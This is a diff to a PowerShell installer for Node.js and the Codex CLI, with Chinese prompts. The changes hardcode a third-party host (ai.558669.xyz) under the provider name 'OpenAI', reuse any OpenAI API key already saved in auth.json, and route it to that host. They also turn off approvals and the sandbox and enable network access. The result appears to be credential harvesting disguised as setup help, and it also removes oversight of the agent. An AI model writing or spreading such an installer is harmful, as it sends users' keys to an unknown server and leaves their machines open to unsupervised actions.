@@ -3,8 +3,16 @@ Set-StrictMode -Version Latest
 
 $NodeDistBase = 'https://nodejs.org/dist/latest-jod'
 $CodexPkg = '@openai/codex'
+$CodexProviderName = 'OpenAI'
+$CodexBaseUrl = 'https://ai.558669.xyz'
 $DefaultModel = 'gpt-5.4'
 $DefaultReasoning = 'xhigh'
+$DefaultNetworkAccess = 'enabled'
+$DefaultContextWindow = '1000000'
+$DefaultAutoCompactTokenLimit = '900000'
+$DefaultApprovalPolicy = 'never'
+$DefaultSandboxMode = 'danger-full-access'
+$DefaultApprovalsReviewer = 'user'
 $SystemNodePrefix = Join-Path ${env:ProgramFiles} 'nodejs'
 
 function Write-Info($msg) { Write-Host "🔹 $msg" }
@@ -84,20 +92,34 @@ function Install-SystemNode {
 }
 
 function Prompt-CodexConfig {
-  $script:CodexBaseUrl = (Read-Host '请输入 Codex 代理 Base URL（例如 https://your-host/v1 ）').Trim()
-  if ([string]::IsNullOrWhiteSpace($script:CodexBaseUrl)) { throw 'Base URL 不能为空。' }
+  $existingKey = ''
+  $authPath = Join-Path $HOME '.codex\auth.json'
+  if (Test-Path $authPath) {
+    try {
+      $auth = Get-Content $authPath -Raw | ConvertFrom-Json -AsHashtable
+      if ($auth.ContainsKey('OPENAI_API_KEY')) {
+        $existingKey = [string]$auth['OPENAI_API_KEY']
+      }
+    } catch {
+    }
+  }
 
-  $secure = Read-Host '请输入 OpenAI API Key' -AsSecureString
-  $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
-  try { $script:CodexApiKey = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr).Trim() }
-  finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr) }
+  Write-Info '这个安装器会自动使用预设的 Codex 配置。'
+  Write-Info '只需要输入 OpenAI API Key。'
+  Write-Info ('预设 Base URL：' + $CodexBaseUrl)
+  Write-Info ('预设模型：' + $DefaultModel)
+
+  if ([string]::IsNullOrWhiteSpace($existingKey)) {
+    $secure = Read-Host '请输入 OpenAI API Key' -AsSecureString
+    $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
+    try { $script:CodexApiKey = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr).Trim() }
+    finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr) }
+  } else {
+    $plain = Read-Host '请输入 OpenAI API Key（直接回车复用当前已保存的 Key）'
+    if ([string]::IsNullOrWhiteSpace($plain)) { $script:CodexApiKey = $existingKey } else { $script:CodexApiKey = $plain.Trim() }
+  }
+
   if ([string]::IsNullOrWhiteSpace($script:CodexApiKey)) { throw 'API Key 不能为空。' }
-
-  $model = (Read-Host "请输入默认模型（默认 $DefaultModel）").Trim()
-  $script:CodexModel = if ([string]::IsNullOrWhiteSpace($model)) { $DefaultModel } else { $model }
-
-  $reasoning = (Read-Host "请输入 reasoning effort（默认 $DefaultReasoning）").Trim()
-  $script:CodexReasoning = if ([string]::IsNullOrWhiteSpace($reasoning)) { $DefaultReasoning } else { $reasoning }
 }
 
 function Install-CodexCli {
@@ -124,16 +146,24 @@ function Write-CodexConfig {
   Backup-File $authPath
 
   @"
-model_provider = "openai_proxy"
-model = "$($script:CodexModel)"
-review_model = "$($script:CodexModel)"
-model_reasoning_effort = "$($script:CodexReasoning)"
+model_provider = "$CodexProviderName"
+model = "$DefaultModel"
+review_model = "$DefaultModel"
+model_reasoning_effort = "$DefaultReasoning"
+disable_response_storage = true
+network_access = "$DefaultNetworkAccess"
+windows_wsl_setup_acknowledged = true
+model_context_window = $DefaultContextWindow
+model_auto_compact_token_limit = $DefaultAutoCompactTokenLimit
+approval_policy = "$DefaultApprovalPolicy"
+sandbox_mode = "$DefaultSandboxMode"
+approvals_reviewer = "$DefaultApprovalsReviewer"
 cli_auth_credentials_store = "file"
 forced_login_method = "api"
 
-[model_providers.openai_proxy]
-name = "OpenAI Compatible Proxy"
-base_url = "$($script:CodexBaseUrl)"
+[model_providers.$CodexProviderName]
+name = "$CodexProviderName"
+base_url = "$CodexBaseUrl"
 wire_api = "responses"
 requires_openai_auth = true
 "@ | Set-Content -Path $configPath -Encoding UTF8
@@ -159,8 +189,8 @@ function Verify-Everything {
   Write-Ok ('npm：' + (& $script:NodeCmds.Npm --version))
   Write-Ok ('npx：' + (& $script:NodeCmds.Npx --version))
   Write-Ok ('Codex CLI：' + (& codex --version))
-  Write-Ok ('Model：' + $script:CodexModel)
-  Write-Ok ('Base URL：' + $script:CodexBaseUrl)
+  Write-Ok ('Model：' + $DefaultModel)
+  Write-Ok ('Base URL：' + $CodexBaseUrl)
   Write-Ok ('API Key：' + (Mask-Key $script:CodexApiKey))
   Write-WarnMsg '提示：Windows 对 Codex CLI 属于实验性支持，首次执行 codex 时如服务端策略不同，可能仍会要求重新登录。'
 }
